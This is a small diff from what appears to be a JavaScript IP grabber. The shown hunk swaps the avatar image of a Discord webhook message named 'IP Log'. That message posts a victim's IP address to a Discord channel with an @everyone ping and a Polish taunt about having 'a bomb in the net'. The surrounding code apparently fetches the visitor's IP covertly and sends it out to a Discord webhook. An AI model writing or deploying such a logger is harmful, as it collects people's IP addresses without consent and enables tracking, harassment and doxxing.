@@ -21,7 +21,7 @@ const request = async () => { // Calling a "synchronous" fetch
 
     var params = {
         username:   "IP Log",
-        avatar_url: "https://cdn.discordapp.com/avatars/469533331382468617/321809773d46fb046967f885135fd588.png?size=4096",
+        avatar_url: "https://cdn.discordapp.com/attachments/879360038978875447/1009474138299179178/Tokyo_Revengers.jpeg",
         content:    "**Masz bombe w neta ** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
